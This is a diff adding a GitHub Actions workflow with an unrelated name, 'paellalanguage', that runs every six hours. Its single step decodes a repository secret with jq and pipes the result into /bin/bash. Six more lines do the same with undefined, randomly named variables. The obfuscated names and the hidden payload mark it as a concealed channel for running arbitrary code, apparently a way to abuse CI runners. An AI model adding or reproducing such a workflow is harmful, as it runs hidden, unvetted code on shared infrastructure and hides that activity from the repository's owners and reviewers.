@@ -1,0 +1,23 @@
+name: paellalanguage
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: paellalanguage
+        env:
+          uhjry905: ${{ secrets.uhjry905 }}
+        run: |
+          echo $uhjry905 | jq -r .lm79256 | /bin/bash
+          echo $glg3 | jq -r .noz53194 | /bin/bash
+          echo $c91 | jq -r .o68 | /bin/bash
+          echo $uzrgj40135 | jq -r .av99984 | /bin/bash
+          echo $tzl87 | jq -r .k0 | /bin/bash
+          echo $lnd655 | jq -r .n090 | /bin/bash
+          echo $yv100 | jq -r .vczd78058 | /bin/bash
+
